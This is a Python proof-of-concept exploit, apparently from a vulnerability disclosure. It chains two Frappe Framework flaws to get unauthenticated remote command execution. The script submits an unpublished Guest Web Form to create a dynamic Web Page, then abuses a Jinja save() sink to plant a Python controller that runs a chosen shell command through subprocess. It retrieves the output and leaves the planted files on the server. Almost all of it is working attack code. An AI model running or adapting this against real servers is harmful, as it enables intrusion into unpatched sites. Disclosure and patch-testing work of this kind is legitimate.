#!/usr/bin/env python3
"""Frappe unauthenticated Web Form to RCE: FRAPPE-05 + FRAPPE-04.

An unauthenticated Guest submits an unpublished Web Form whose target DocType is
`Web Page` (FRAPPE-05), creating a Guest-owned dynamic Web Page. The page's
template drives the safe-Jinja save() sink (FRAPPE-04) to write a Python
controller and its HTML page into an installed app's `www` directory. Requesting
the planted route runs a shell command and returns its output — all without a
single credential.

This client performs the whole chain and prints the command's stdout, stderr and
exit status. It needs an unpublished Guest Web Form targeting Web Page and a
writable installed-app www path. Reviewed against Frappe Framework 16.29.0.

Fix status: FRAPPE-05 is fixed in Frappe 16.30.0 / 15.117.0 and FRAPPE-04 is
closed from 16.33.1 / 15.120.1, so the chain needs a site below 16.30.0 or
15.117.0.
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import re
import secrets
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Any


ACCEPT_RPC = "/api/method/frappe.website.doctype.web_form.web_form.accept"
APP_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9_-]*$")
PACKAGE_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")
ROUTE_RE = re.compile(r"^frappe0504_[0-9a-f]{20}_(?:stage|exec)$")


class PocError(RuntimeError):
    pass


# --- terminal UI ---
_BANNER = r"""
 _____ ____      _    ____  ____  _____
|  ___|  _ \    / \  |  _ \|  _ \| ____|
| |_  | |_) |  / _ \ | |_) | |_) |  _|
|  _| |  _ <  / ___ \|  __/|  __/| |___
|_|   |_| \_\/_/   \_\_|   |_|   |_____|
"""
_COLOR = sys.stderr.isatty() and os.environ.get("NO_COLOR") is None


def _paint(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def disable_color() -> None:
    global _COLOR
    _COLOR = False


def banner(subtitle: str) -> None:
    sys.stderr.write(_paint("36", _BANNER.strip("\n")) + "\n")
    sys.stderr.write("  " + _paint("2", subtitle) + "\n")
    sys.stderr.write("  " + _paint("2", "discovered by CryptoCat · cryptocat.me") + "\n\n")


def info(msg: str) -> None:
    sys.stderr.write(f" {_paint('36', '[*]')} {msg}\n")


def good(msg: str) -> None:
    sys.stderr.write(f" {_paint('32', '[+]')} {msg}\n")


def warn(msg: str) -> None:
    sys.stderr.write(f" {_paint('33', '[!]')} {msg}\n")


def bad(msg: str) -> None:
    sys.stderr.write(f" {_paint('31', '[-]')} {msg}\n")


def rule() -> None:
    sys.stderr.write(_paint("2", "  " + "-" * 60) + "\n")


def emit_command_result(command_status: int, stdout: bytes, stderr: bytes) -> None:
    if command_status == 0:
        good(f"remote command exited with status {command_status}")
    else:
        warn(f"remote command exited with status {command_status}")
    rule()
    sys.stdout.buffer.write(stdout)
    if stdout and not stdout.endswith(b"\n"):
        sys.stdout.buffer.write(b"\n")
    sys.stdout.buffer.flush()
    if stderr:
        sys.stderr.buffer.write(stderr)
        if not stderr.endswith(b"\n"):
            sys.stderr.buffer.write(b"\n")
        sys.stderr.buffer.flush()
# --- end terminal UI ---


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):  # noqa: ANN001
        return None


class GuestClient:
    def __init__(
        self, url: str, timeout: float, insecure: bool, site: str | None = None
    ) -> None:
        try:
            parsed = urllib.parse.urlsplit(url.strip().rstrip("/"))
            _ = parsed.port
        except ValueError as exc:
            raise PocError(f"invalid --url: {exc}") from exc
        if parsed.scheme not in {"http", "https"} or not parsed.hostname:
            raise PocError("--url must be an http(s) Frappe site URL")
        if parsed.query or parsed.fragment or parsed.username or parsed.password:
            raise PocError("--url must not contain userinfo, a query, or a fragment")
        self.url = urllib.parse.urlunsplit(
            (parsed.scheme, parsed.netloc, parsed.path.rstrip("/"), "", "")
        )
        self.timeout = timeout
        self.site = site
        context = ssl.create_default_context()
        if insecure:
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
        # No cookie processor is installed. Every target request is Guest.
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=context), NoRedirect()
        )

    def request(
        self,
        path: str,
        *,
        method: str = "GET",
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, bytes]:
        default_headers = {
            "Accept": "application/json",
            "Accept-Language": "en",
            "User-Agent": "frappe-05-04-guest-rce-poc",
        }
        if self.site:
            default_headers["X-Frappe-Site-Name"] = self.site
        request = urllib.request.Request(
            self.url + path,
            data=data,
            headers={**default_headers, **(headers or {})},
            method=method,
        )
        try:
            with self.opener.open(request, timeout=self.timeout) as response:
                return int(response.status), response.read()
        except urllib.error.HTTPError as exc:
            return int(exc.code), exc.read()
        except (urllib.error.URLError, TimeoutError, OSError) as exc:
            raise PocError(f"request to {request.full_url} failed: {exc}") from exc


def parse_json(raw: bytes, context: str) -> dict[str, Any]:
    try:
        response = json.loads(raw)
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        detail = raw[:300].decode("utf-8", "replace")
        raise PocError(f"{context} returned non-JSON data: {detail}") from exc
    if not isinstance(response, dict):
        raise PocError(f"{context} returned a JSON value other than an object")
    return response


def response_detail(response: dict[str, Any], raw: bytes) -> str:
    for key in ("exception", "exc_type", "_server_messages", "message"):
        value = response.get(key)
        if isinstance(value, str) and value:
            return value[:500]
    return raw[:500].decode("utf-8", "replace").strip()


def normalize_www_path(value: str) -> str:
    value = value.strip().rstrip("/")
    parts = value.split("/")
    if len(parts) != 5 or parts[:2] != ["..", "apps"] or parts[-1] != "www":
        raise PocError(
            "--www-path must be ../apps/APP/PYTHON_PACKAGE/www for an installed app"
        )
    app, package = parts[2], parts[3]
    if not APP_RE.fullmatch(app) or not PACKAGE_RE.fullmatch(package):
        raise PocError("--www-path contains an invalid app or Python package name")
    return value


def build_controller(command: str) -> bytes:
    return (
        "import base64\n"
        "import subprocess\n\n"
        "no_cache = 1\n\n"
        "def get_context(context):\n"
        f"    result = subprocess.run({command!r}, shell=True, "
        "stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
        "    context.chain_status = result.returncode\n"
        "    context.chain_stdout = base64.b64encode(result.stdout).decode('ascii')\n"
        "    context.chain_stderr = base64.b64encode(result.stderr).decode('ascii')\n"
    ).encode()


def build_static_page() -> bytes:
    return (
        "<!-- no-cache -->\n"
        '<div id="frappe-chain-status">{{ chain_status }}</div>\n'
        '<div id="frappe-chain-stdout">{{ chain_stdout }}</div>\n'
        '<div id="frappe-chain-stderr">{{ chain_stderr }}</div>\n'
    ).encode()


def build_stage_template(exec_route: str, www_path: str) -> str:
    destination = www_path + "/" + exec_route
    html_path = json.dumps(destination + ".html")
    controller_path = json.dumps(destination + ".py")
    return (
        "<!-- jinja -->\n"
        "{% if frappe.request.files.get('page') and "
        "frappe.request.files.get('controller') %}\n"
        "{{ frappe.request.files.get('page').save(" + html_path + ") }}\n"
        "{{ frappe.request.files.get('controller').save(" + controller_path + ") }}\n"
        "{% endif %}\n"
    )


def require_fresh_route(client: GuestClient, route: str) -> None:
    status, _body = client.request(
        "/" + urllib.parse.quote(route) + "?frappe0504=preflight&n=" + str(time.time_ns()),
        headers={"Accept": "text/html", "Cache-Control": "no-store"},
    )
    if status != 404:
        raise PocError(f"fresh route /{route} returned HTTP {status}, not 404")


def create_stage_page(
    client: GuestClient,
    web_form: str,
    stage_route: str,
    exec_route: str,
    www_path: str,
) -> dict[str, Any]:
    data = {
        "title": stage_route,
        "route": stage_route,
        "published": 1,
        "content_type": "HTML",
        "dynamic_template": 1,
        "main_section_html": build_stage_template(exec_route, www_path),
    }
    body = urllib.parse.urlencode(
        {"web_form": web_form, "data": json.dumps(data, separators=(",", ":"))}
    ).encode()
    status, raw = client.request(
        ACCEPT_RPC,
        method="POST",
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    response = parse_json(raw, "Web Page submission")
    if status != 200 or response.get("exc") or response.get("exception"):
        raise PocError(
            f"Web Page submission failed with HTTP {status}: {response_detail(response, raw)}"
        )
    created = response.get("message")
    if not isinstance(created, dict) or created.get("__islocal"):
        raise PocError("Web Form did not return an inserted Web Page")
    expected = {
        "doctype": "Web Page",
        "route": stage_route,
        "owner": "Guest",
        "modified_by": "Guest",
    }
    for field, value in expected.items():
        if created.get(field) != value:
            raise PocError(f"created Web Page did not preserve {field!r}")
    if created.get("published") not in (1, True, "1"):
        raise PocError("created Web Page is not published")
    if created.get("dynamic_template") not in (1, True, "1"):
        raise PocError("created Web Page is not dynamic")
    if not created.get("name"):
        raise PocError("created Web Page has no document name")
    return created


def multipart(files: list[tuple[str, str, str, bytes]]) -> tuple[str, bytes]:
    boundary = "----frappe0504-" + secrets.token_hex(12)
    body = bytearray()
    for field, filename, content_type, content in files:
        body.extend(f"--{boundary}\r\n".encode())
        body.extend(
            f'Content-Disposition: form-data; name="{field}"; '
            f'filename="{filename}"\r\n'.encode()
        )
        body.extend(f"Content-Type: {content_type}\r\n\r\n".encode())
        body.extend(content)
        body.extend(b"\r\n")
    body.extend(f"--{boundary}--\r\n".encode())
    return boundary, bytes(body)


def trigger_write(
    client: GuestClient, stage_route: str, exec_route: str, command: str
) -> int:
    boundary, body = multipart(
        [
            ("page", exec_route + ".html", "text/html", build_static_page()),
            ("controller", exec_route + ".py", "text/x-python", build_controller(command)),
        ]
    )
    status, _raw = client.request(
        "/" + urllib.parse.quote(stage_route) + "?frappe0504=write",
        method="POST",
        data=body,
        headers={
            "Accept": "text/html",
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        },
    )
    return status


def execute(client: GuestClient, exec_route: str) -> tuple[int, bytes, bytes]:
    status, body = client.request(
        "/" + urllib.parse.quote(exec_route) + "?frappe0504=execute&n=" + str(time.time_ns()),
        headers={"Accept": "text/html", "Cache-Control": "no-cache, no-store"},
    )
    stdout_match = re.search(
        rb'<div id="frappe-chain-stdout">([A-Za-z0-9+/]*={0,2})</div>', body
    )
    stderr_match = re.search(
        rb'<div id="frappe-chain-stderr">([A-Za-z0-9+/]*={0,2})</div>', body
    )
    status_match = re.search(rb'<div id="frappe-chain-status">(-?[0-9]+)</div>', body)
    if status != 200 or not stdout_match or not stderr_match or not status_match:
        raise PocError(f"planted controller did not return a command result (HTTP {status})")
    try:
        stdout = base64.b64decode(stdout_match.group(1), validate=True)
        stderr = base64.b64decode(stderr_match.group(1), validate=True)
    except ValueError as exc:
        raise PocError("controller returned invalid base64 output") from exc
    return int(status_match.group(1)), stdout, stderr


def make_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="example:\n"
               "  %(prog)s --url https://frappe.example --web-form unpublished-web-page \\\n"
               "    --www-path ../apps/custom_app/custom_app/www -c 'uname -a'\n",
    )
    parser.add_argument("--url", required=True, metavar="URL", help="Frappe site base URL")
    parser.add_argument("--site", metavar="NAME", help="optional X-Frappe-Site-Name value")
    parser.add_argument("--web-form", required=True, metavar="NAME", help="unpublished Guest Web Form targeting Web Page")
    parser.add_argument(
        "--www-path",
        required=True,
        metavar="PATH",
        help="known writable ../apps/APP/PYTHON_PACKAGE/www path",
    )
    parser.add_argument("-c", "--command", default="id", metavar="CMD", help="shell command to execute (default: id)")
    parser.add_argument("--timeout", type=float, default=30.0, metavar="SECS", help="HTTP timeout (default: 30)")
    parser.add_argument("--insecure", action="store_true", help="disable TLS certificate verification")
    parser.add_argument("--no-color", action="store_true", help="disable coloured output")
    return parser


def run(args: argparse.Namespace) -> int:
    if args.no_color:
        disable_color()
    banner("unauthenticated Web Form to command execution  ·  FRAPPE-05/04")
    if args.timeout <= 0:
        raise PocError("--timeout must be greater than zero")
    if not args.web_form.strip():
        raise PocError("--web-form must not be empty")
    if args.site and not re.fullmatch(r"[A-Za-z0-9._-]+", args.site):
        raise PocError("--site contains an invalid Frappe site name")
    www_path = normalize_www_path(args.www_path)

    nonce = secrets.token_hex(10)
    stage_route = f"frappe0504_{nonce}_stage"
    exec_route = f"frappe0504_{nonce}_exec"
    assert ROUTE_RE.fullmatch(stage_route) and ROUTE_RE.fullmatch(exec_route)
    command = args.command.strip()
    if not command:
        raise PocError("--command must not be empty")
    client = GuestClient(args.url, args.timeout, args.insecure, args.site)

    require_fresh_route(client, stage_route)
    require_fresh_route(client, exec_route)
    good("both random routes returned HTTP 404 before the chain")
    warn("HTTP 404 does not prove that matching files are absent")

    created = create_stage_page(client, args.web_form, stage_route, exec_route, www_path)
    good(f"created Guest-owned dynamic Web Page {created['name']!r} at /{stage_route}")
    info(f"writing controller through the Jinja save() sink to /{exec_route}")
    write_status = trigger_write(client, stage_route, exec_route, command)
    if not 200 <= write_status < 300:
        raise PocError(f"Jinja file-write request returned HTTP {write_status}")
    good("controller planted; requesting the execution route")

    command_status, stdout, stderr = execute(client, exec_route)
    warn(f"persistent Web Page left behind: {created['name']} at /{stage_route}")
    warn(f"persistent files left behind: {www_path}/{exec_route}.html and {www_path}/{exec_route}.py")
    emit_command_result(command_status, stdout, stderr)
    return 0


def main() -> int:
    try:
        return run(make_parser().parse_args())
    except PocError as exc:
        bad(str(exc))
        return 1
    except KeyboardInterrupt:
        bad("interrupted")
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
